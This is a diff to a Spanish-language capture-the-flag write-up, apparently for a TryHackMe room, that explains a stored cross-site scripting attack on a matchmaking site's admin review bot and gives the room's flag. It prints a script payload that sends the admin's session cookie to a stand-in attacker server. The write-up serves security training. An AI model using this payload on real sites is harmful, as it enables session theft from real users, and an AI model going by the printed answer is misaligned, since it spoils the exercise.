@@ -17,6 +17,8 @@
 
 ### Task 1: Admin Review
 
+**Explicación:** La web de *matchmaking* permite dejar un mensaje en el perfil/candidatura (un campo que se renderiza sin sanitizar). Se inyecta un payload clásico de `script` (por ejemplo `<script>fetch('https://tu-servidor/?c='+document.cookie)</script>`). Un bot de revisión (o el admin) visita la página con la sesión privilegiada: el payload se ejecuta en ese contexto. En el panel del admin (visible tras el robo de cookie/sesión del bot, o directamente en la respuesta tras la revisión) está la flag: `THM{XSS_CuP1d_Str1k3s_Ag41n}`.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | What is the flag? | `THM{XSS_CuP1d_Str1k3s_Ag41n}` |
